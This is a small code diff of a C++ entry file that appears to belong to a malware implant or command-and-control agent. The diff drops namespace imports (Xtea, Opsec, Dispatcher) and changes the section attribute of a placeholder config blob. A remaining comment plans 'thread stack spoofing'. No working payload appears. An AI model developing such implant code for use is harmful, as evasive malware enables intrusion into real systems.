@@ -1,16 +1,5 @@
 #include <core/include/base.hpp>
 
-using namespace Xtea;
-using namespace Opsec;
-using namespace Parser;
-using namespace Stream;
-using namespace Modules;
-using namespace Dispatcher;
-using namespace Memory::Context;
-using namespace Main;
-
-// TODO: consider hash-tables for API struct
-
 VOID Entrypoint() {
     if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
         return;
@@ -20,8 +9,7 @@ VOID Entrypoint() {
 }
 
 namespace Main {
-    UINT8 __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
-
+    UINT8 DATA_SXN Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
     VOID MainRoutine() {
         static int retry = 0;
         // TODO: thread stack spoofing
